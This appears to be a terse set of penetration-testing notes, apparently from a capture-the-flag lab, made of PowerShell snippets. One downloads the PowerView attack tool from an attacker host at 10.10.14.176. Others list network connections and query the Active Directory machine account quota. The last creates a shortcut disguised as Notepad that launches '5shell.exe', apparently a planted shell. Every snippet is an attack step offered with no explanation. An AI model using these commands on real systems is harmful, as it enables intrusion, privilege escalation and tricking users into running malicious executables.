```Powershell
Invoke-WebRequest -Uri http://10.10.14.176:8000/PowerView.ps1 -OutFile PowerView.ps1
```

```Powershell
netstat -aon
```

```Powershell
Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DSMachineAccountQuota
```

Shortcuts
```Powershell
$targetPath = "C:\xampp\htdocs\5shell.exe"
$shortcutPath = "C:\Common Applications\Notepad.lnk"
$shell = New-Object -ComObject WScript.Shell
$shortcut = $shell.CreateShortcut($shortcutPath)
$shortcut.TargetPath = $targetPath
$shortcut.Save()
```